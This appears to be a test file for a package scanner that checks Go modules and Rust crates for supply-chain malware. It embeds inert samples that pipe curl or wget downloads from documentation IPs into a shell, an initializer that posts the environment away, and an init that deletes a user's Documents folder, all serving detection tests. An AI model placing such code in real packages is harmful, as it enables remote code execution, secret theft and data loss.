"""Part C (0.1.9): a Go module's and a crate's code is read, in registry and guard scans.

The engine's Go reader (G-1, go_package) and Rust reader (R-1, rs_crate) read
a module zip's .go files (with its cgo packages' C) and a crate's .rs files
for what their code does, with the tests a package's JavaScript and Python
get for the same moment, and the same reasons and severities:
- Go: what a package's init functions, package-level variables'
  initializers and cgo constructors reach runs when any program that imports
  the package starts: the import-time test (SC-IMPORT-RISK);
- Rust: a build script and a procedural-macro crate run on the machine that
  builds a dependent: the install-script test (SC-INSTALL-HOOK, CRITICAL);
  #[ctor] runs before a program's main: the import-time test;
- the rest runs when the code is called: its strong reasons are SC-USE-RISK.
Test code a build leaves out is not read; //go:generate commands are listed
(SC-GO-GENERATE, INFO); code larger than PACKAGE_CODE_CHARS is not read
(INCOMPLETE), and so is a file over the member limit. Each .go and .rs file
gets the file rules too. A module or a crate with nothing found is OK: it used
to be INCOMPLETE (N-1).

N-17: the Rust crate inside a PyPI sdist (maturin, setuptools-rust), which pip
has cargo build when it installs the sdist, is read the same way: each
directory with a Cargo.toml is a crate, a .rs file is in the nearest one.

The samples are inert fragments: never built, documentation addresses
(203.0.113.x) and .invalid hosts.
"""
import io
import json
import tarfile
import time
import unittest
import zipfile
from unittest import mock

from lazaret.registry import repo
from lazaret.scanner import _native
from tests.registry._review_support import B64_DATA, EXFIL_JS

GO_MOD = "module example.test/m\n\ngo 1.21\n"


def gomod_zip(files, root="example.test/m@v1.0.0"):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in sorted(files.items()):
            zf.writestr(f"{root}/{name}", data)
    return buf.getvalue()


def crate_tgz(files, root="c-1.0.0"):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in sorted(files.items()):
            raw = data if isinstance(data, bytes) else data.encode("utf-8")
            info = tarfile.TarInfo(f"{root}/{name}")
            info.size = len(raw)
            tf.addfile(info, io.BytesIO(raw))
    return buf.getvalue()


def scan(data, container, kind):
    budget = repo.Budget(deadline=time.monotonic() + 60, deadline_detail="the test's budget")
    return repo._scan_artifact(data, container, kind, False, budget)


def go(files):
    return scan(gomod_zip(dict({"go.mod": GO_MOD}, **files)), "zip", "gomod")


def rust(files, manifest='[package]\nname = "c"\nversion = "1.0.0"\n'):
    return scan(crate_tgz(dict({"Cargo.toml": manifest}, **files)), "tgz", "crate")


def found(res, rule=None):
    return [(i["rule"], i["sev"], i["file"], i["line"]) for i in res["issues"]
            if (rule is None and i["rule"].startswith("SC-")) or i["rule"] == rule]


# Go: init code that builds `wget -O - … | /bin/bash &` from a string array and runs it (the 2025 typosquats' shape)
INIT_GO = '''package m

import "os/exec"

var parts = []string{"wget", " -O - ", "https://203.0.113.7/a.sh", " | /bin/bash &"}

func init() {
	cmd := parts[0] + parts[1] + parts[2] + parts[3]
	exec.Command("/bin/sh", "-c", cmd).Start()
}
'''
# Go: a package-level variable's initializer that sends the environment away
VAR_GO = '''package m

import (
	"net/http"
	"os"
	"strings"
)

var _ = report()

func report() int {
	http.Post("http://203.0.113.5/u", "text/plain", strings.NewReader(strings.Join(os.Environ(), "\\n")))
	return 0
}
'''
# Go: the same download run only when the package's function is called
USE_GO = '''package m

import "os/exec"

func Update() error {
	return exec.Command("/bin/sh", "-c", "curl -s https://203.0.113.7/a.sh | sh").Run()
}
'''
# Go: a cgo preamble whose C constructor runs a download at start
CGO_GO = '''package m

/*
#include <stdlib.h>
__attribute__((constructor)) static void boot(void) { system("curl -s https://203.0.113.7/a.sh | sh"); }
*/
import "C"

func F() int { return 1 }
'''
CLEAN_GO = "package m\n\nimport \"strings\"\n\nfunc Upper(s string) string { return strings.ToUpper(s) }\n"
# Go: init deletes a folder of the user's (F-06's review shape)
DELETE_GO = 'package m\n\nimport "os"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n'

# Rust: a build script, a procedural macro, a #[ctor] and a library function that pipe a download into a shell
BUILD_RS = '''use std::process::Command;

fn main() {
    let url = format!("https://{}/{}", "203.0.113.9", "x.sh");
    Command::new("sh").arg("-c").arg(format!("curl -s {} | sh", url)).status().ok();
}
'''
MACRO_RS = '''use proc_macro::TokenStream;

#[proc_macro]
pub fn mac(input: TokenStream) -> TokenStream {
    std::process::Command::new("sh").arg("-c").arg("curl -s https://203.0.113.9/s | sh").spawn().ok();
    input
}
'''
CTOR_RS = '''#[ctor::ctor]
fn init() {
    std::process::Command::new("sh").arg("-c").arg("curl -s https://203.0.113.9/s | sh").spawn().ok();
}

pub fn f() {}
'''
USE_RS = '''pub fn update() {
    std::process::Command::new("sh").arg("-c").arg("curl -s https://203.0.113.9/s | sh").status().ok();
}
'''
CLEAN_RS = "pub fn add(a: u32, b: u32) -> u32 { a + b }\n"
# a build script as most are: it asks the compiler its version and tells cargo when to run again
PROBE_RS = '''use std::process::Command;

fn main() {
    let out = Command::new(std::env::var("RUSTC").unwrap_or("rustc".into())).arg("--version").output().unwrap();
    if String::from_utf8_lossy(&out.stdout).contains("nightly") {
        println!("cargo:rustc-cfg=nightly");
    }
    println!("cargo:rerun-if-changed=build.rs");
}
'''


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class GoTests(unittest.TestCase):
    def test_init_code_that_runs_a_download(self):
        res = go({"m.go": INIT_GO})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual(found(res), [("SC-IMPORT-RISK", "CRITICAL", "m@v1.0.0/m.go", 9)])
        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"]
        self.assertEqual(issue["msg"], "m@v1.0.0/m.go runs when any program that imports its package starts (init "
                                       "functions, package-level variables' initializers, cgo constructors), and it "
                                       "runs a downloaded script through a shell.")

    def test_a_package_level_initializer_that_sends_the_environment(self):
        res = go({"r.go": VAR_GO})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
        self.assertEqual([r for r, _s, _f, _l in found(res)], ["SC-IMPORT-RISK"])

    def test_a_cgo_constructor(self):
        res = go({"c.go": CGO_GO})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/c.go")])

    def test_code_run_when_used(self):
        res = go({"u.go": USE_GO, "x.go": CLEAN_GO})
        self.assertEqual(found(res), [("SC-USE-RISK", "CRITICAL", "m@v1.0.0/u.go", 6)])
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual((res["useTime"]["files"], res["useTime"]["ofFiles"]), (2, 2))

    def test_code_no_build_reads_is_not_read(self):
        for name in ("m_test.go", "testdata/t.go", "_x.go", "vendor/example.test/v/v.go"):
            with self.subTest(name=name):
                res = go({name: INIT_GO.replace("package m", "package t"), "m.go": CLEAN_GO})
                self.assertEqual((res["verdict"], found(res)), ("OK", []))

    def test_a_file_is_left_out_only_for_a_constraint_go_reads_as_ignore(self):
        """F-06: Go needs white space after `//go:build` and `+build`, so `//go:buildignore` and `// +buildignore`
        are comments and the file builds; only a constraint Go reads as `ignore` and'd with other tags, where it
        counts, leaves a file out (goread's build_ignored)."""
        after_package = DELETE_GO.replace("package m\n", "package m\n\n//go:build ignore\n", 1)
        for header in ("//go:buildignore\n\n", "//go:buildignore\n", "// +buildignore\n\n", "// +buildignore\n",
                       "//go:build(ignore)\n\n", "/* //go:build ignore */\n\n", "/*\n//go:build ignore\n*/\n\n",
                       "// +build ignore\n", "//go:build ignore\n//go:build ignore\n\n",
                       "//go:build ignore || linux\n\n", "//go:build !ignore\n\n", None):
            with self.subTest(header=header):
                res = go({"m.go": CLEAN_GO, "d.go": after_package if header is None else header + DELETE_GO})
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
                self.assertEqual([(r, s, f) for r, s, f, _l in found(res)],
                                 [("SC-IMPORT-RISK", "CRITICAL", "m@v1.0.0/d.go")])
        for header in ("//go:build ignore\n\n", "//go:build ignore\n", "//go:build ignore && linux\n\n",
                       "//go:build (ignore)\n\n", "//go:build\tignore\n\n", "// +build ignore\n\n"):
            with self.subTest(header=header):
                res = go({"m.go": CLEAN_GO, "d.go": header + DELETE_GO})
                self.assertEqual((res["verdict"], found(res)), ("OK", []))

    def test_a_test_file_s_name_ends_in_test_go_exactly(self):
        """Go's test files end in `_test.go` exactly: `m_TEST.go` and `m_Test.go` are built, so they are read."""
        for name in ("m_TEST.go", "m_Test.go"):
            with self.subTest(name=name):
                res = go({name: INIT_GO, "m.go": CLEAN_GO})
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
                self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", f"m@v1.0.0/{name}")])

    def test_a_clean_module_is_ok(self):
        res = go({"m.go": CLEAN_GO, "sub/s.go": "package sub\n\nfunc init() { println(\"ready\") }\n"})
        self.assertEqual((res["verdict"], res["verdictReason"], found(res)), ("OK", "no supply-chain indicators", []))

    def test_go_generate_is_listed(self):
        res = go({"m.go": "package m\n\n//go:generate stringer -type=Kind\n//go:generate go run gen.go\ntype Kind int\n"})
        self.assertEqual(res["verdict"], "OK")
        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-GO-GENERATE"]
        self.assertEqual((issue["sev"], issue["line"]), ("INFO", 3))
        self.assertEqual(issue["msg"], "m@v1.0.0/m.go has `stringer -type=Kind` (and 1 more): go generate runs such "
                                       "commands when someone runs it in the module's folders; a build never does.")

    def test_a_file_the_parser_refuses_is_still_read_by_the_file_rules(self):
        # (F-06: and the module is INCOMPLETE: a build may compile what the engine's parser refuses)
        res = go({"m.go": CLEAN_GO, "bad.go": 'package m\n\nconst k = "AKIA' + "Q7R2ZK9M4TXW8B3N" + '"\nfunc (\n'})
        self.assertEqual(res["verdict"], "INCOMPLETE")
        self.assertIn("S-TOKEN", {i["rule"] for i in res["issues"]})
        (cut,) = [i for i in res["issues"] if i["rule"] == "SC-TRUNCATED"]
        self.assertEqual(cut["file"], "m@v1.0.0/bad.go")
        self.assertIn("the engine's Go parser refused m@v1.0.0/bad.go at line 5 (", cut["msg"])
        self.assertIn("code", res["incomplete"])

    def test_a_file_is_read_as_the_go_toolchain_reads_its_bytes(self):
        """F-06's review: the reader decides on the bytes as Go reads them (go_text): a lone "\\r" is no line end to
        Go, a second byte order mark is code to it, and a file Go refuses (a NUL its reader meets, a //go:build line
        that does not parse) is never left out. The rules read the text as before (the third round): a UTF-16 file's
        token is found, while the reader, as Go, refuses its NULs."""
        body = DELETE_GO.encode()
        for data in (b"// c\r//go:build ignore\n\n" + body, b"// c\r// +build ignore\n\n" + body,
                     b"//+build ignore\r// +build x\n\n" + body, b"\xef\xbb\xbf\xef\xbb\xbf//go:build ignore\n\n" + body,
                     b'package m\n\nimport "os"\n\nvar s = "a\rb"\n\nfunc init() { os.RemoveAll("/home/example/Documents") }\n'):
            with self.subTest(data=data[:40]):
                res = go({"m.go": CLEAN_GO, "d.go": data})
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
                self.assertEqual([(r, s, f) for r, s, f, _l in found(res)], [("SC-IMPORT-RISK", "CRITICAL", "m@v1.0.0/d.go")])
        refused = [b"//go:build ignore\n\npackage m\n// \x00\n\n" + body[len(b"package m\n\n"):],
                   b"//go:build ignore\r\rpackage m\r\r" + body[len(b"package m\n\n"):]]
        for data in refused:
            with self.subTest(data=data[:24]):
                res = go({"m.go": CLEAN_GO, "d.go": data})
                self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
                self.assertEqual([(i["rule"], i["file"]) for i in res["issues"] if i["rule"] == "SC-TRUNCATED"],
                                 [("SC-TRUNCATED", "m@v1.0.0/d.go")])
        # UTF-16: the rules read the decoded text (its token, at its line); Go refuses the bytes (NULs, invalid
        # UTF-8), and so does the reader, with no SC-TRUNCATED of its own (it is not text to Go): the init that
        # never compiles is no SC-IMPORT-RISK (a token is listed, the verdict OK)
        token = 'const k = "AKIA' + "Q7R2ZK9M4TXW8B3N" + '"\n'
        for h in ("//go:build ignore\n\n", "// +build ignore\n\n", ""):
            text = h + DELETE_GO + token
            for data, codec in ((b"\xff\xfe" + text.encode("utf-16-le"), "utf-16-le"),
                                (b"\xfe\xff" + text.encode("utf-16-be"), "utf-16-be"),
                                (text.encode("utf-16-le"), "utf-16-le")):
                with self.subTest(header=h, codec=codec, bom=data[:2]):
                    res = go({"m.go": CLEAN_GO, "d.go": data})
                    self.assertEqual(res["verdict"], "OK", res["issues"])
                    self.assertEqual([(i["rule"], i["file"], i["line"]) for i in res["issues"] if i["rule"] == "S-TOKEN"],
                                     [("S-TOKEN", "m@v1.0.0/d.go", text.count("\n"))])
                    self.assertEqual([i for i in res["issues"] if i["rule"] in ("SC-TRUNCATED", "SC-IMPORT-RISK")], [])
        # the quiet controls stay quiet: CRLF, one byte order mark
        for data in (b"//go:build ignore\r\n\r\n" + body, b"\xef\xbb\xbf//go:build ignore\n\n" + body):
            res = go({"m.go": CLEAN_GO, "d.go": data})
            self.assertEqual((res["verdict"], found(res)), ("OK", []))

    def test_a_testdata_package_the_module_imports_is_read(self):
        """F-06's review: a package in testdata/ that the module's code imports is built (go list -deps, go mod
        vendor), so the reader reads it, and the file rules too; one nothing imports stays unread."""
        lib = 'package m\n\nimport _ "example.test/m/testdata/x"\n\nfunc F() int { return 1 }\n'
        x = DELETE_GO.replace("package m", "package x") + f'\nvar blob = "{B64_DATA}"\n'
        res = go({"lib.go": lib, "testdata/x/x.go": x})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
        self.assertEqual({(i["rule"], i["file"]) for i in res["issues"] if i["rule"].startswith("SC-")},
                         {("SC-IMPORT-RISK", "m@v1.0.0/testdata/x/x.go"), ("SC-B64", "m@v1.0.0/testdata/x/x.go")})
        res = go({"lib.go": CLEAN_GO, "testdata/x/x.go": x})
        self.assertEqual((res["verdict"], found(res)), ("OK", []))

    def test_testdata_packages_are_read_as_go_builds_them(self):
        """F-06's third round: the reader is given a testdata/ package's files when an import names it (its answer's
        `wanted`), so they are decoded and counted only then: a chain whose last link sorts first, a package below
        another folder; one nothing imports is data, even past the reader's bound; a file the parser refused reads
        none of them."""
        lib = lambda imp: f'package m\n\nimport _ "{imp}"\n\nfunc F() int {{ return 1 }}\n'
        x = DELETE_GO.replace("package m", "package x")
        res = go({"lib.go": lib("example.test/m/testdata/z"), "testdata/a/a.go": x,
                  "testdata/z/z.go": 'package z\n\nimport _ "example.test/m/testdata/a"\n'})
        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/testdata/a/a.go")])
        res = go({"lib.go": lib("example.test/m/sub/testdata/x"), "sub/testdata/x/x.go": x})
        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/sub/testdata/x/x.go")])
        # (not imported: never decoded, nor counted against the reader's bound)
        big = {f"testdata/fx/f{k}.go": x + "// " + "x" * 200 + "\n" for k in range(4)}
        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", 400), \
                mock.patch.object(repo.lazaret, "decode_go_member", wraps=repo.lazaret.decode_go_member) as decoded:
            res = go(dict(big, **{"lib.go": CLEAN_GO}))
            self.assertEqual((res["verdict"], found(res)), ("OK", []))
            self.assertEqual([c.args[0] for c in decoded.call_args_list], ["m@v1.0.0/lib.go"])
            res = go(dict(big, **{"lib.go": lib("example.test/m/testdata/fx")}))
            self.assertEqual(res["verdict"], "SUSPICIOUS")             # (imported: read, f0.go's init found)
            self.assertEqual(sorted(i["file"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"),
                             [f"m@v1.0.0/testdata/fx/f{k}.go" for k in (1, 2, 3)])   # (past the bytes kept)
        # a refused file reads none (the module is INCOMPLETE for it), and a refused template in a `_` folder no
        # import names holds nothing (the review's casc and uscore)
        res = go({"lib.go": CLEAN_GO, "testdata/s/s.go": x, "tools/gen/bad.go": "package gen\n\nfunc F( {\n"})
        self.assertEqual((res["verdict"], [r for r, _s, _f, _l in found(res)]), ("INCOMPLETE", ["SC-TRUNCATED"]))
        res = go({"lib.go": CLEAN_GO, "testdata/fx/f.go": x, "_examples/tmpl/t.go": "package {{.Name}}\n\nfunc F() {}\n"})
        self.assertEqual((res["verdict"], found(res)), ("OK", []))

    def test_an_imported_testdata_package_is_read_as_the_module_s_other_code(self):
        """F-06's third round: an imported testdata/ package's files are read as the module's others are: as Go reads
        their bytes (a "\\r" in a string), with their decoding's findings, a file a constraint leaves out unread by
        the rules too; and only the package asked for is decoded."""
        lib = 'package m\n\nimport _ "example.test/m/testdata/x"\n\nfunc F() int { return 1 }\n'
        x = DELETE_GO.replace("package m", "package x")
        crx = x.replace("\nfunc init", '\nvar s = "a\rb"\n\nfunc init')
        res = go({"lib.go": lib, "testdata/x/x.go": crx})
        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/testdata/x/x.go")])
        blob = x + "var blob = `" + "\x01\x02\x03\x04" * 100 + "`\n"            # (not text to the rules, Go's to Go)
        res = go({"lib.go": lib, "testdata/x/x.go": blob})
        self.assertEqual(sorted((r, f) for r, _s, f, _l in found(res)),
                         [("SC-IMPORT-RISK", "m@v1.0.0/testdata/x/x.go"), ("SC-TRUNCATED", "m@v1.0.0/testdata/x/x.go")])
        ignored = '//go:build ignore\n\npackage x\n\nconst k = "AKIA' + "Q7R2ZK9M4TXW8B3N" + '"\n'
        res = go({"lib.go": lib, "testdata/x/x.go": x, "testdata/x/gen.go": ignored})
        self.assertEqual([(i["rule"], i["file"]) for i in res["issues"]], [("SC-IMPORT-RISK", "m@v1.0.0/testdata/x/x.go")])
        with mock.patch.object(repo.lazaret, "decode_go_member", wraps=repo.lazaret.decode_go_member) as decoded:
            res = go({"lib.go": lib, "testdata/x/x.go": x, "testdata/y/y.go": x.replace("package x", "package y")})
        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/testdata/x/x.go")])
        self.assertEqual(sorted(c.args[0] for c in decoded.call_args_list), ["m@v1.0.0/lib.go", "m@v1.0.0/testdata/x/x.go"])

    def test_an_imported_testdata_file_not_kept_is_incomplete(self):
        """F-06: a testdata/ file over the member limit, or past the bytes kept, is not read: INCOMPLETE when an
        import names its package, nothing when none does (the review's tdbig)."""
        lib = 'package m\n\nimport _ "example.test/m/testdata/x"\n\nfunc F() int { return 1 }\n'
        x = DELETE_GO.replace("package m", "package x") + "// " + "x" * 200 + "\n"
        with mock.patch.object(repo, "MAX_MEMBER", 200):
            res = go({"lib.go": lib, "testdata/x/x.go": x})
            self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
            self.assertEqual([i["file"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"], ["m@v1.0.0/testdata/x/x.go"])
            res = go({"lib.go": CLEAN_GO, "testdata/x/x.go": x})
            self.assertEqual((res["verdict"], found(res)), ("OK", []))
        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", 200):
            res = go({"lib.go": lib, "testdata/x/x.go": x})
            self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
            (cut,) = [i for i in res["issues"] if i["rule"] == "SC-TRUNCATED"]
            self.assertEqual(cut["file"], "m@v1.0.0/testdata/x/x.go")
            self.assertIn("is in a testdata/ package the module imports", cut["msg"])
            res = go({"lib.go": CLEAN_GO, "testdata/x/x.go": x})
            self.assertEqual((res["verdict"], found(res)), ("OK", []))

    def test_an_import_of_another_modules_testdata_is_major(self):
        """F-06's third round: example.test/tb imports example.test/ta's testdata/x, which ta's own scan leaves out
        as data: SC-GO-TESTDATA-IMPORT, MAJOR, in the importing module, with the path (the review's ta and tb)."""
        res = go({"tb.go": 'package m\n\nimport _ "example.test/ta/testdata/x"\n\nfunc G() int { return 2 }\n'})
        self.assertEqual(res["verdict"], "WARN", res["issues"])
        (issue,) = [i for i in res["issues"] if i["rule"].startswith("SC-")]
        self.assertEqual((issue["rule"], issue["sev"], issue["file"], issue["line"]),
                         ("SC-GO-TESTDATA-IMPORT", "MAJOR", "m@v1.0.0/tb.go", 3))
        self.assertIn("m@v1.0.0/tb.go imports example.test/ta/testdata/x, a package in another module's testdata/ "
                      "folder", issue["msg"])

    def test_an_import_of_a_nested_module_s_testdata_is_major(self):
        """F-06's fourth round (the review's nst): example.test/nst imports example.test/nst/inner/testdata/x, where
        example.test/nst/inner is a module of its own, which the zip leaves out: the import names no testdata/ folder
        the module has, so it is another module's, SC-GO-TESTDATA-IMPORT; and the nested module's own scan leaves its
        unimported testdata/ out (the review's nstinner)."""
        nst = 'package m\n\nimport _ "example.test/m/inner/testdata/x"\n'
        for extra in ({}, {"testdata/y/y.go": DELETE_GO.replace("package m", "package y")}):
            with self.subTest(extra=sorted(extra)):
                res = go(dict({"nst.go": nst}, **extra))
                self.assertEqual(res["verdict"], "WARN", res["issues"])
                self.assertEqual([(r, s, f, l) for r, s, f, l in found(res)],
                                 [("SC-GO-TESTDATA-IMPORT", "MAJOR", "m@v1.0.0/nst.go", 3)])
        inner = gomod_zip({"go.mod": "module example.test/m/inner\n\ngo 1.21\n", "inner.go": "package inner\n",
                           "testdata/x/x.go": DELETE_GO.replace("package m", "package x")}, root="example.test/m/inner@v1.0.0")
        res = scan(inner, "zip", "gomod")
        self.assertEqual((res["verdict"], found(res)), ("OK", []))

    def test_a_refused_file_has_one_truncated_finding(self):
        """F-06's third round: a .go file that does not decode to text is SC-TRUNCATED once (its decoding's), not
        once more for the parser's refusal; a refused file that is text, once (the parser's)."""
        junk = b"package m\n" + bytes(range(1, 9)) * 60 + b"\n"
        res = go({"m.go": CLEAN_GO, "junk.go": junk})
        self.assertEqual([i["file"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"], ["m@v1.0.0/junk.go"])
        self.assertEqual(res["truncated"], 1)

    def test_a_lone_carriage_return_keeps_the_rules_line_numbers(self):
        """F-06's third round: Go reads a lone "\\r" as white space, the rules as a line end; the reader's findings
        are numbered as the rules number lines (the review's crline)."""
        src = (b'package m\n\n// one\r// two\r// three\n\nimport (\n\t"os/exec"\n)\n\nconst k = "AKIA'
               + b'Q7R2ZK9M4TXW8B3N"\n\nfunc init() {\n\texec.Command("/bin/sh", "-c", "curl -s https://203.0.113.7/a.sh | sh").Run()\n}\n')
        res = go({"m.go": src})
        lines = {i["rule"]: i["line"] for i in res["issues"] if i["rule"] in ("S-TOKEN", "SC-IMPORT-RISK")}
        self.assertEqual(lines, {"S-TOKEN": 11, "SC-IMPORT-RISK": 14}, res["issues"])

    def test_a_package_in_vendor_itself_is_read(self):
        # `m/vendor` is importable and built (`m/vendor/x` must be imported as `x`: not read, test_code_no_build_...)
        res = go({"a.go": 'package m\n\nimport _ "example.test/m/vendor"\n',
                  "vendor/v.go": DELETE_GO.replace("package m", "package vendor")})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-IMPORT-RISK", "m@v1.0.0/vendor/v.go")])

    def test_a_module_too_large_to_read_is_incomplete(self):
        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", 40):
            res = go({"m.go": CLEAN_GO})
        self.assertEqual(res["verdict"], "INCOMPLETE")
        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-TRUNCATED"]
        self.assertIn(f"the module's code ({len(CLEAN_GO)} characters) is more than the reader takes at once (40)",
                      issue["msg"])

    def test_files_no_build_compiles_get_no_file_rules_either(self):
        # (rivo/uniseg's line-break tests hold escaped URLs: SC-HEXSTR CRITICAL, in a file no dependent ever builds)
        blob = B64_DATA                                                      # (base64, 320 characters)
        escaped = "\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f"                                  # ("http://", escaped)
        for name in ("m_test.go", "testdata/x.go", "_gen.go"):
            with self.subTest(name=name):
                res = go({"m.go": CLEAN_GO, name: f'package m\n\nvar fixture = "{blob}"\nvar u = "{escaped}"\n'})
                self.assertEqual((res["verdict"], [i["rule"] for i in res["issues"]]), ("OK", []))
        res = go({"m.go": CLEAN_GO + f'\nvar fixture = "{blob}"\n'})
        self.assertEqual(res["verdict"], "WARN")                             # (in code a build compiles: read)

    def test_a_go_file_over_the_member_limit_is_incomplete(self):
        # (the reader never saw it: a crate or a module with a 17 MB file was OK, unread)
        with mock.patch.object(repo, "MAX_MEMBER", 100):
            res = go({"m.go": CLEAN_GO, "big.go": "package m\n\n" + "// x\n" * 40})
            self.assertEqual(res["verdict"], "INCOMPLETE")
            self.assertEqual([i["file"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"], ["m@v1.0.0/big.go"])
            res = go({"m.go": CLEAN_GO, "big_test.go": "package m\n\n" + "// x\n" * 40})
            self.assertEqual(res["verdict"], "OK")                         # (a file no build compiles: not read anyway)

    def test_cgo_c_is_kept_whatever_text_came_before_it(self):
        constructor = '__attribute__((constructor)) static void boot(void) { system("curl -s https://203.0.113.7/a.sh | sh"); }\n'
        files = {"m.go": 'package m\n\n// #include "boot.h"\nimport "C"\n\nfunc F() int { return 1 }\n',
                 "a.txt": "x" * 400, "boot.h": "#include <stdlib.h>\n" + constructor}
        with mock.patch.object(repo, "DEFERRED_TEXT_BUDGET", 100):
            res = go(files)
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", 60):             # (the C not all kept: not read)
            res = go({"m.go": files["m.go"][:40], "boot.h": files["boot.h"]})
        self.assertEqual(res["verdict"], "INCOMPLETE")
        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-TRUNCATED"]
        self.assertIn("the module's code (its C files not all kept) is more than the reader takes at once (60)",
                      issue["msg"])

    def test_go_files_in_an_npm_package_are_not_read_as_a_module(self):
        data = crate_tgz({"package.json": '{"name": "x", "version": "1.0.0"}', "index.js": "module.exports = 1;\n",
                          "native/x.go": INIT_GO}, root="package")
        res = scan(data, "tgz", "npm")
        self.assertEqual((res["verdict"], found(res)), ("OK", []))


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class RustTests(unittest.TestCase):
    def test_a_build_script_that_runs_a_download(self):
        res = rust({"build.rs": BUILD_RS, "src/lib.rs": CLEAN_RS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual(found(res), [("SC-INSTALL-HOOK", "CRITICAL", "build.rs", 5)])
        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
        self.assertTrue(issue["msg"].startswith("build.rs is the crate's build script: cargo runs it on the machine that "
                                                "builds any crate that depends on it, and it "), issue["msg"])
        self.assertIn("pipes a download into a shell", issue["msg"])

    def test_the_build_script_package_build_names(self):
        manifest = '[package]\nname = "c"\nversion = "1.0.0"\nbuild = "tools/gen.rs"\n'
        res = rust({"tools/gen.rs": BUILD_RS, "src/lib.rs": CLEAN_RS}, manifest)
        self.assertEqual([(r, f) for r, _s, f, _l in found(res)], [("SC-INSTALL-HOOK", "tools/gen.rs")])
        # build = false: cargo runs no build script, whatever build.rs holds
        manifest = '[package]\nname = "c"\nversion = "1.0.0"\nbuild = false\n'
        res = rust({"build.rs": BUILD_RS, "src/lib.rs": CLEAN_RS}, manifest)
        self.assertEqual((res["verdict"], found(res)), ("OK", []))

    def test_a_procedural_macro(self):
        manifest = '[package]\nname = "c"\nversion = "1.0.0"\n\n[lib]\nproc-macro = true\n'
        res = rust({"src/lib.rs": MACRO_RS}, manifest)
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
        self.assertTrue(issue["msg"].startswith("src/lib.rs is a procedural macro: it runs inside the compiler of every "
                                                "crate that uses it, and it "), issue["msg"])
        # crate-type = ["proc-macro"]: cargo builds it as one too, proc-macro = false or not
        for lib in ('crate-type = ["proc-macro"]', 'proc-macro = false\ncrate-type = ["proc-macro"]'):
            with self.subTest(lib):
                res = rust({"src/lib.rs": MACRO_RS}, f'[package]\nname = "c"\nversion = "1.0.0"\n\n[lib]\n{lib}\n')
                self.assertEqual((res["verdict"], [i["rule"] for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]),
                                 ("SUSPICIOUS", ["SC-INSTALL-HOOK"]))

    def test_a_ctor(self):
        res = rust({"src/lib.rs": CTOR_RS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"]
        self.assertEqual((issue["sev"], issue["file"]), ("CRITICAL", "src/lib.rs"))
        self.assertTrue(issue["msg"].startswith("src/lib.rs runs before a program's main (#[ctor], a load section, an "
                                                "exported main), and it runs a downloaded script through a shell"))

    def test_code_run_when_used(self):
        res = rust({"src/lib.rs": USE_RS})
        self.assertEqual(found(res), [("SC-USE-RISK", "CRITICAL", "src/lib.rs", 2)])

    def test_tests_benches_and_examples_are_not_read(self):
        for name in ("tests/t.rs", "benches/b.rs", "examples/e.rs"):
            with self.subTest(name=name):
                res = rust({name: CTOR_RS, "src/lib.rs": CLEAN_RS})
                self.assertEqual((res["verdict"], found(res)), ("OK", []))

    def test_test_items_in_src_are_not_read_by_the_file_rules(self):
        """N-20: what #[cfg(test)] or #[test] marks is never built into a dependent, as tests/ is not."""
        tests = '#[cfg(test)]\nmod tests {\n    const V: &str = "' + B64_DATA + '";\n}\n'
        res = rust({"src/lib.rs": CLEAN_RS + tests})
        self.assertEqual((res["verdict"], found(res)), ("OK", []))
        res = rust({"src/lib.rs": CLEAN_RS + tests + 'pub const K: &str = "' + B64_DATA + '";\n'})
        self.assertEqual((res["verdict"], found(res)), ("WARN", [("SC-B64", "MAJOR", "src/lib.rs", 6)]))

